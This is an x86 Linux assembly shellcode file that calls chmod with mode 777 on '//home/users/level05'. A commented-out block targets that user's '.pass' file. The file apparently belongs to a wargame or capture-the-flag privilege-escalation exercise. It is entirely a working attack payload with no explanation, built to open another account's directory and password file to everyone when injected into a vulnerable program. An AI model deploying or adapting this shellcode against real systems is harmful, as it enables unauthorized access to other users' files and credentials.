section .text     ; section declaration

global _start     ; Default entry point for ELF linking

_start:

    xor     eax, eax
    push    eax
    push    0x35306c65
    push    0x76656c2f
    push    0x73726573
    push    0x752f656d
    push    0x6f682f2f
    mov     al, 15     ; put 15 into eax, since chmod is syscall #15
    mov     ebx, esp    ; get the start of filename
    xor     ecx, ecx
    mov     cx, 511    ; 511 is octal 777
    int     0x80        ; Call the kernel to make the system call happen



# .pass
    ;push    0x73736170
    ;push    0x2e2f3530
    ;push    0x6c657665
    ;push    0x6c2f7372
    ;push    0x6573752f
    ;push    0x656d6f68
    ;push    0x2f2f2f2f
